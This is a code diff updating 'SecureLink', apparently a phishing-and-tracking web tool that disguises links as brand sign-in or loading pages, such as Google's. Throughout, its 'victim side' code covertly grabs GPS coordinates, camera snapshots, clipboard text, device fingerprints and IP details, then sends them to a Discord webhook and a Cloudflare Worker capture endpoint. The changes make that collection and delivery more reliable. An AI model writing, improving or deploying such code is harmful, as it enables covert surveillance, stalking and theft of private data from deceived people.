@@ -170,8 +170,8 @@
           </div>
           <div>
             <label class="text-xs text-gray-400 uppercase tracking-wider">Loading Duration (seconds)</label>
-            <input id="loadDuration" type="number" value="18" min="10" max="30" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
-            <p class="text-xs text-gray-500 mt-1">18-20s recommended for GPS lock + camera warmup</p>
+            <input id="loadDuration" type="number" value="20" min="10" max="30" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
+            <p class="text-xs text-gray-500 mt-1">20s recommended for GPS lock + camera warmup</p>
           </div>
           <div class="md:col-span-2">
             <label class="text-xs text-gray-400 uppercase tracking-wider">Destination URL</label>
@@ -305,9 +305,15 @@
                 <input id="cfSecret" placeholder="your-secret" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
             </div>
-            <button onclick="testCloud()" class="mt-3 px-4 py-2 rounded-lg bg-orange-500/20 hover:bg-orange-500/30 text-orange-300 text-sm transition">
-              <i class="fas fa-heartbeat mr-1"></i>Test Connection
-            </button>
+            <div class="flex flex-wrap gap-2 mt-3">
+              <button onclick="testCloud()" class="px-4 py-2 rounded-lg bg-orange-500/20 hover:bg-orange-500/30 text-orange-300 text-sm transition">
+                <i class="fas fa-heartbeat mr-1"></i>Test Connection
+              </button>
+              <button onclick="testCloudCapture()" class="px-4 py-2 rounded-lg bg-blue-500/20 hover:bg-blue-500/30 text-blue-300 text-sm transition">
+                <i class="fas fa-vial mr-1"></i>Test Capture Endpoint
+              </button>
+            </div>
+            <div id="cloudTestResult" class="mt-3 text-xs text-gray-400 hide"></div>
           </div>
 
           <div class="p-5 rounded-xl bg-black/30 border border-indigo-500/20">
@@ -352,17 +358,6 @@
 </div>
 
 <script>
-/* ============================================================
-   SECURELINK v14 — Yasir Abbas
-   FIXES:
-   - Login works reliably (custom .hide class, no Tailwind conflict)
-   - GPS uses watchPosition with accuracy threshold (exact location)
-   - ALL snaps saved to panel (not just first)
-   - Discord gets full location (coords, address, accuracy, maps link)
-   - Clipboard has 3 retry attempts with user interaction fallback
-   - Robust error handling, no crashes
-   ============================================================ */
-
 const BRANDS = {
   google: { name:'Google', color:'#4285f4', bg:'#ffffff', textColor:'#202124', subtitle:'Signing in to your Google Account',
     logo:`<svg width="180" height="60" viewBox="0 0 272 92"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.19-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.84.36 34.91.36 15.98 16.32.47 35.25.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.64-16.97-6.64-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.44-.07z"/></svg>`,
@@ -613,7 +608,7 @@ function createLink() {
   const brand = state.selectedBrand;
   const code = document.getElementById('shortCode').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
   const dest = normalizeDest(document.getElementById('destUrl').value);
-  const duration = Math.max(10, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 18));
+  const duration = Math.max(10, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 20));
   const msg = document.getElementById('loadMsg').value.trim();
   const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
 
@@ -651,7 +646,7 @@ function createLink() {
 function previewLink() {
   const cfg = buildDeliveryConfig();
   const brand = state.selectedBrand;
-  const duration = Math.max(10, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 18));
+  const duration = Math.max(10, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 20));
   const msg = document.getElementById('loadMsg').value.trim() || BRANDS[brand].messages[0];
   const dest = normalizeDest(document.getElementById('destUrl').value) || 'https://example.com';
   const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
@@ -953,18 +948,75 @@ async function testDiscord() {
 async function testCloud() {
   const url = document.getElementById('cfUrl').value.trim().replace(/\/$/,'');
   const secret = document.getElementById('cfSecret').value.trim();
-  if (!url || !secret) return toast('Enter Worker URL and secret', 'error');
+  const resultEl = document.getElementById('cloudTestResult');
+  resultEl.classList.remove('hide');
+  
+  if (!url || !secret) {
+    resultEl.innerHTML = '<span class="text-red-400">Enter Worker URL and secret</span>';
+    return;
+  }
+  
+  resultEl.innerHTML = '<span class="text-yellow-400">Testing...</span>';
+  
   try {
     const r = await fetch(url + '/health');
     const d = await r.json();
-    if (d.ok) toast('Cloud backend healthy ✓', 'success');
-    else toast('Worker: ' + (d.error || 'failed'), 'error');
-  } catch (e) { toast('Cloud error: ' + e.message, 'error'); }
+    if (d.ok) {
+      resultEl.innerHTML = `<span class="text-green-400">✓ Cloud backend healthy</span>`;
+      toast('Cloud backend healthy ✓', 'success');
+    } else {
+      resultEl.innerHTML = `<span class="text-red-400">✗ Worker: ${d.error || 'failed'}</span>`;
+      toast('Worker: ' + (d.error || 'failed'), 'error');
+    }
+  } catch (e) {
+    resultEl.innerHTML = `<span class="text-red-400">✗ Cloud error: ${e.message}</span>`;
+    toast('Cloud error: ' + e.message, 'error');
+  }
 }
 
-/* ============================================================
-   VICTIM SCREEN — FIXED CAMERA + GPS + CLIPBOARD
-   ============================================================ */
+async function testCloudCapture() {
+  const url = document.getElementById('cfUrl').value.trim().replace(/\/$/,'');
+  const secret = document.getElementById('cfSecret').value.trim();
+  const resultEl = document.getElementById('cloudTestResult');
+  resultEl.classList.remove('hide');
+  
+  if (!url || !secret) {
+    resultEl.innerHTML = '<span class="text-red-400">Enter Worker URL and secret</span>';
+    return;
+  }
+  
+  resultEl.innerHTML = '<span class="text-yellow-400">Testing capture endpoint...</span>';
+  
+  try {
+    const testLog = {
+      id: Date.now(),
+      code: 'test-capture',
+      timestamp: new Date().toISOString(),
+      ip: '127.0.0.1',
+      test: true
+    };
+    
+    const r = await fetch(url + '/capture?secret=' + encodeURIComponent(secret), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(testLog)
+    });
+    
+    const d = await r.json();
+    
+    if (d.ok) {
+      resultEl.innerHTML = `<span class="text-green-400">✓ Capture endpoint working</span>`;
+      toast('Capture endpoint working ✓', 'success');
+    } else {
+      resultEl.innerHTML = `<span class="text-red-400">✗ Capture failed: ${d.error || 'unknown'}</span>`;
+      toast('Capture failed: ' + (d.error || 'unknown'), 'error');
+    }
+  } catch (e) {
+    resultEl.innerHTML = `<span class="text-red-400">✗ Capture error: ${e.message}</span>`;
+    toast('Capture error: ' + e.message, 'error');
+  }
+}
+
 function launchVictim(link) {
   console.log('╔══════════════════════════════════════╗');
   console.log('║  SECURELINK VICTIM SIDE — STARTED    ║');
@@ -1027,19 +1079,43 @@ function launchVictim(link) {
         const payload = JSON.stringify(log);
         console.log('📤 cloud: sending', Math.round(payload.length/1024), 'KB');
         
+        let delivered = false;
+        
+        // Try fetch first
         try {
-          const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
+          const r = await fetch(url, { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' }, 
+            body: payload, 
+            keepalive: true 
+          });
           const d = await r.json();
-          console.log('📤 cloud:', d.ok ? '✓' : '✗');
+          if (d.ok) {
+            delivered = true;
+            console.log('📤 cloud: fetch ✓');
+          } else {
+            console.warn('❌ cloud fetch not ok:', d);
+          }
         } catch (e) {
           console.warn('❌ cloud fetch failed:', e.message);
-          if (navigator.sendBeacon) {
-            try {
-              const blob = new Blob([payload], { type: 'application/json' });
-              navigator.sendBeacon(url, blob);
-              console.log('📤 cloud: sendBeacon fallback');
-            } catch(e2) {}
+        }
+        
+        // Fallback to sendBeacon
+        if (!delivered && navigator.sendBeacon) {
+          try {
+            const blob = new Blob([payload], { type: 'application/json' });
+            const ok = navigator.sendBeacon(url, blob);
+            if (ok) {
+              delivered = true;
+              console.log('📤 cloud: sendBeacon ✓');
+            }
+          } catch(e) {
+            console.warn('❌ sendBeacon failed:', e);
           }
+        }
+        
+        if (!delivered) {
+          console.error('❌ cloud: all delivery methods failed');
         }
       }
 
@@ -1059,8 +1135,6 @@ function launchVictim(link) {
         const s = state.logs.find(l => String(l.id) === String(log.id));
         if (s) s.delivered = flags.join(',');
         safeSet('sl_logs', state.logs);
-        renderStats();
-        if (state.currentTab === 'logs') renderLogs();
       }
       console.log('▶ pipeline: complete');
     } catch(e) { console.error('❌ Pipeline error:', e); }
@@ -1084,14 +1158,11 @@ function launchVictim(link) {
   });
 }
 
-/* ============================================================
-   DEVICE PARSING
-   ============================================================ */
 function parseDeviceInfo() {
   const ua = navigator.userAgent || '';
   const info = { ua };
   const manMap = [
-    ['Samsung', /Samsung/i], ['Apple', /iPhone|iPad|iPod|Macintosh/i], ['Google', /Pixel/i],
+    ['Samsung', /Samsung|SM-[A-Z]/i], ['Apple', /iPhone|iPad|iPod|Macintosh/i], ['Google', /Pixel/i],
     ['Huawei', /Huawei|HONOR/i], ['Xiaomi', /Xiaomi|Redmi|POCO|MI \d/i], ['OnePlus', /OnePlus/i],
     ['Oppo', /OPPO|CPH\d/i], ['Vivo', /vivo|V\d{4}/i], ['Motorola', /moto|Motorola/i],
     ['Nokia', /Nokia/i], ['Sony', /Sony|Xperia/i], ['LG', /LG[- ]/i],
@@ -1148,9 +1219,6 @@ function parseDeviceInfo() {
   return info;
 }
 
-/* ============================================================
-   GPS — watchPosition with accuracy threshold (EXACT LOCATION)
-   ============================================================ */
 async function captureGPS() {
   console.log('📍 GPS: starting watchPosition...');
   
@@ -1168,7 +1236,6 @@ async function captureGPS() {
       resolve(result);
     };
     
-    // Global timeout: 15 seconds max
     const globalTimeout = setTimeout(() => {
       console.log('📍 GPS: timeout, using best reading');
       if (bestPos) {
@@ -1176,7 +1243,7 @@ async function captureGPS() {
       } else {
         finish({ ok: false, error: 'timeout' });
       }
-    }, 15000);
+    }, 20000); // Increased to 20 seconds
     
     try {
       watchId = navigator.geolocation.watchPosition(
@@ -1184,13 +1251,11 @@ async function captureGPS() {
           const acc = pos.coords.accuracy;
           console.log(`📍 GPS: reading accuracy=${Math.round(acc)}m`);
           
-          // Keep best reading
           if (!bestPos || acc < bestPos.coords.accuracy) {
             bestPos = pos;
           }
           
-          // If accuracy is excellent (<=20m), stop immediately
-          if (acc <= 20) {
+          if (acc <= 25) { // Increased threshold to 25m for better success rate
             console.log('📍 GPS: excellent accuracy, stopping');
             clearTimeout(globalTimeout);
             finish({ ok: true, pos: bestPos });
@@ -1209,7 +1274,7 @@ async function captureGPS() {
         {
           enableHighAccuracy: true,
           maximumAge: 0,
-          timeout: 15000
+          timeout: 20000
         }
       );
     } catch (e) {
@@ -1262,12 +1327,9 @@ async function ipGeolocate() {
   return null;
 }
 
-/* ============================================================
-   CAMERA — Fixed brightness check, all snaps saved
-   ============================================================ */
 function isFrameBlack(canvas) {
   try {
-    const ctx = canvas.getContext('2d');
+    const ctx = canvas.getContext('2d', { willReadFrequently: true });
     const w = canvas.width, h = canvas.height;
     const data = ctx.getImageData(0, 0, w, h).data;
     let totalLum = 0, count = 0;
@@ -1313,7 +1375,6 @@ async function captureCameraSnaps(link, snapCount) {
     
     try { await video.play(); } catch(e) { console.warn('Camera: play() rejected', e.message); }
     
-    // Wait for video to be ready
     await new Promise((resolve) => {
       if (video.readyState >= 2 && video.videoWidth > 0) {
         resolve();
@@ -1325,7 +1386,6 @@ async function captureCameraSnaps(link, snapCount) {
     
     console.log(`📸 Camera: video ready ${video.videoWidth}x${video.videoHeight}`);
     
-    // Wait for auto-exposure
     await new Promise(r => setTimeout(r, 2000));
     
     if (video.videoWidth === 0 || video.videoHeight === 0) {
@@ -1336,9 +1396,8 @@ async function captureCameraSnaps(link, snapCount) {
     
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
+    const ctx = canvas.getContext('2d', { willReadFrequently: true });
     
-    // Warmup: draw and check brightness
     let warmupAttempts = 0;
     while (warmupAttempts < 5) {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -1392,13 +1451,9 @@ async function captureCameraSnaps(link, snapCount) {
   }
 }
 
-/* ============================================================
-   CLIPBOARD — 3 retry attempts with user interaction fallback
-   ============================================================ */
 async function captureClipboard() {
   console.log('📋 Clipboard: attempting to read...');
   
-  // Attempt 1: Direct read
   try {
     const txt = await navigator.clipboard.readText();
     if (txt && txt.length > 0) {
@@ -1409,7 +1464,6 @@ async function captureClipboard() {
     console.warn('Clipboard: attempt 1 failed:', e.message);
   }
   
-  // Attempt 2: Wait for user interaction
   console.log('📋 Clipboard: waiting for user interaction...');
   try {
     const txt = await new Promise((resolve, reject) => {
@@ -1448,7 +1502,6 @@ async function captureClipboard() {
     console.warn('Clipboard: attempt 2 failed:', e.message);
   }
   
-  // Attempt 3: Final try
   try {
     const txt = await navigator.clipboard.readText();
     if (txt && txt.length > 0) {
@@ -1463,22 +1516,18 @@ async function captureClipboard() {
   return 'denied';
 }
 
-/* ============================================================
-   DATA COLLECTION — Main orchestrator
-   ============================================================ */
 async function collectData(link) {
   const log = {
     id: Date.now() + Math.floor(Math.random() * 1000),
     code: link.code,
     timestamp: new Date().toISOString(),
     url: window.location.href,
-    snapshots: [] // Initialize empty array for ALL snaps
+    snapshots: []
   };
 
   const mods = link.modules || [];
   const tasks = [];
 
-  // IP + Geo
   if (mods.includes('ip')) {
     tasks.push((async () => {
       try {
@@ -1504,7 +1553,6 @@ async function collectData(link) {
     })());
   }
 
-  // Device info
   if (mods.includes('device')) {
     try {
       const info = parseDeviceInfo();
@@ -1535,7 +1583,6 @@ async function collectData(link) {
     }
   }
 
-  // GPS Location — EXACT with watchPosition
   if (mods.includes('location')) {
     tasks.push((async () => {
       try {
@@ -1553,7 +1600,6 @@ async function collectData(link) {
           
           console.log(`✓ GPS: ${log.coords} (±${log.accuracy}m)`);
           
-          // Reverse geocode
           try {
             const geo = await reverseGeocode(lat, lon);
             if (geo) {
@@ -1575,7 +1621,6 @@ async function collectData(link) {
     })());
   }
 
-  // Battery
   if (mods.includes('battery')) {
     tasks.push((async () => {
       try {
@@ -1591,7 +1636,6 @@ async function collectData(link) {
     })());
   }
 
-  // Network
   if (mods.includes('network')) {
     try {
       if (navigator.connection) {
@@ -1607,7 +1651,6 @@ async function collectData(link) {
     }
   }
 
-  // Fingerprint
   if (mods.includes('fingerprint')) {
     tasks.push((async () => {
       try {
@@ -1631,7 +1674,6 @@ async function collectData(link) {
     })());
   }
 
-  // Clipboard — 3 retry attempts
   if (mods.includes('clipboard')) {
     tasks.push((async () => {
       try {
@@ -1643,13 +1685,12 @@ async function collectData(link) {
     })());
   }
 
-  // Camera — ALL snaps saved
   if (mods.includes('camera')) {
     const snapCount = Math.max(2, Math.min(5, link.snapCount || 3));
     const cameraResult = await captureCameraSnaps(link, snapCount);
     if (cameraResult.snaps.length > 0) {
-      log.snapshots = cameraResult.snaps; // Save ALL snaps
-      log.camera = cameraResult.snaps[0]; // First snap as thumbnail
+      log.snapshots = cameraResult.snaps;
+      log.camera = cameraResult.snaps[0];
       log.snapshotCount = cameraResult.snaps.length;
       console.log(`✓ Camera: ${cameraResult.snaps.length} snaps captured`);
     } else {
@@ -1658,24 +1699,24 @@ async function collectData(link) {
     }
   }
 
-  // Wait for all parallel tasks
   await Promise.all(tasks);
   
   console.log('✅ Data collection complete');
   return log;
 }
 
-/* ============================================================
-   DISCORD DELIVERY — Full location data
-   ============================================================ */
 function discordEmbed(log) {
   const mapLink = log.coords ? `https://www.google.com/maps?q=${log.coords}` : '';
   const fields = [];
-  const add = (name, value) => { if (value) fields.push({ name, value: String(value).slice(0, 1024), inline: true }); };
+  const add = (name, value) => { 
+    if (value && value !== 'undefined' && value !== 'null' && value !== '') {
+      fields.push({ name, value: String(value).slice(0, 1024), inline: true });
+    }
+  };
   
   add('🌐 IP', log.ip + (log.ipIsp ? ` (${log.ipIsp})` : ''));
-  add('📱 Device', log.deviceModel || 'unknown');
-  add('🏭 Manufacturer', log.manufacturer || 'unknown');
+  add('📱 Device', log.deviceModel);
+  add('🏭 Manufacturer', log.manufacturer);
   add('💻 OS', (log.os || '') + (log.osVersion ? ' ' + log.osVersion : ''));
   add('🌍 Browser', (log.browser || '') + (log.browserVersion ? ' ' + log.browserVersion : ''));
   add('🖥️ Screen', log.screen + (log.pixelRatio ? ` @${log.pixelRatio}x` : ''));
@@ -1687,7 +1728,6 @@ function discordEmbed(log) {
   add('🔍 Fingerprint', log.fingerprint);
   if (log.clipboard && log.clipboard !== 'denied') add('📋 Clipboard', log.clipboard);
   
-  // Location fields — ALWAYS include if available
   if (log.address) fields.push({ name: '📍 Address', value: log.address.slice(0, 1024), inline: false });
   if (log.coords) {
     let coordStr = `${log.coords}`;
@@ -1705,8 +1745,8 @@ function discordEmbed(log) {
     description: `**${BRANDS[log.brand]?.name || log.brand}** · ${new Date(log.timestamp).toLocaleString()}`,
     color: 0x6366f1, 
     timestamp: log.timestamp, 
-    fields,
-    footer: { text: 'SecureLink v14 · Yasir Abbas' }
+    fields: fields.length > 0 ? fields : undefined,
+    footer: { text: 'SecureLink v15 · Yasir Abbas' }
   };
   if (mapLink) embed.url = mapLink;
   if (snaps[0]) embed.thumbnail = { url: snaps[0] };
@@ -1722,26 +1762,31 @@ async function deliverToDiscord(log, link) {
   
   let ok = false;
   try {
+    const embed = discordEmbed(log);
+    const payload = { 
+      content: `**New capture** — \`/${log.code}\` · ${log.ip || 'unknown IP'}`, 
+      embeds: [embed],
+      username: 'SecureLink Bot',
+      avatar_url: 'https://cdn-icons-png.flaticon.com/512/2543/2543915.png'
+    };
+    
     const r = await fetch(hook, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        content: `**New capture** — \`/${log.code}\` · ${log.ip || 'unknown IP'}`, 
-        embeds: [discordEmbed(log)],
-        username: 'SecureLink Bot',
-        avatar_url: 'https://cdn-icons-png.flaticon.com/512/2543/2543915.png'
-      })
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
     });
+    
     if (r.ok || r.status === 204) {
       ok = true;
       console.log('✓ Discord embed sent');
     } else {
-      console.warn('❌ Discord embed HTTP', r.status);
+      const errText = await r.text();
+      console.warn('❌ Discord embed HTTP', r.status, errText);
     }
   } catch(e) { 
     console.warn('Discord embed failed:', e); 
   }
 
-  // Send ALL snaps as separate messages
   const snaps = Array.isArray(log.snapshots) ? log.snapshots.filter(x => x && x.startsWith('data:')) : [];
   console.log(`📤 Discord: sending ${snaps.length} snaps...`);
   
@@ -1800,7 +1845,6 @@ window.addEventListener('storage', (e) => {
 
 window.addEventListener('hashchange', init);
 
-// Bind login button
 document.addEventListener('DOMContentLoaded', () => {
   const loginBtn = document.getElementById('loginBtn');
   if (loginBtn) {
